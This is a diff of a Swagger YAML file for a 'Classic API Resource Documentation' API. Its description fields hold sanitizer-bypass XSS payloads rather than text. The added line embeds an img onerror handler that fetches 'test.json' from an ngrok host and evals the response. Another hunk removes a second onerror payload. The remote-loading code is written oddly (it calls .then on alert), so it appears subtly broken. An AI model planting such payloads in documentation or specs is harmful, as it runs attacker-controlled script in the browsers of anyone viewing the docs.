@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><input><a title='</input><img src onerror=alert(`https://215c-140-213-51-225.ap.ngrok.io/test.json`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><input><a title='</input><img src onerror=alert(`https://xssss215c-140-213-51-225.ap.ngrok.io/test.json`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
 version: production
 basePath: /JSSResource/
 produces:
@@ -26,7 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><input> value="</input></img onerror=alert('input') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext></form>
 
           format: int64
           in: path
